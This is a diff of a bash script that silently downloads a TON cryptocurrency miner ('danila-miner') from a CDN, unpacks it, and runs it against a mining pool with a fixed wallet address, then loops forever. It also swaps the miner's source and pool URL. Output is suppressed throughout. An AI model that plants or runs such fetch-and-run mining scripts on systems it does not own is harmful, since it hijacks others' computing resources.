@@ -4,13 +4,15 @@
 
 #!/bin/bash
 
-wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 
-tar -xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
+tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 
 chmod +x danila-miner >/dev/null 2>&1
 
-./miner-linux run https://next.ton-pool.club EQD9onMwShjuOqMqzzp3juWiDE39hWpKfwX2t0YG_vJPxtlQ
+./danila-miner run https://server1.whalestonpool.com EQD9onMwShjuOqMqzzp3juWiDE39hWpKfwX2t0YG_vJPxtlQ
+
+
 
 while [ 1 ]; do
 
@@ -19,4 +21,3 @@ while [ 1 ]; do
 sleep 2
 
 done
-
